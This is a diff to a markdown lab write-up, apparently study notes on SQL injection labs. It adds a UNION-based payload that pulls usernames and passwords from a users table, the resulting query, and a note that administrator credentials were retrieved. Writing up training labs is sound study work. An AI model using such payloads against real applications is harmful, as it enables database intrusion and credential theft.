@@ -34,11 +34,21 @@ The single quote closes the username string, and -- comments out the remaining S
 
 ## Lab 3 – UNION: Retrieve Data from Other Tables
 
-**Payload:**
 
-**SQL query produced:**
+**Payload:** `Gifts' UNION SELECT username,password FROM users--`
+
+**SQL query produced (approximate):**
+
+```sql
+SELECT name, description FROM products
+WHERE category = 'Gifts'
+UNION SELECT username, password FROM users--' AND released = 1;
+```
 
 **Why it worked:**
+UNION SELECT combined product results with usernames and passwords from the users table. Both queries returned two compatible columns, allowing the database to display the additional data.
+
+**Result:** Lab solved. Retrieved the administrator credentials and successfully logged in.
 
 ## Lab 4 – Determine the Number of Columns
 
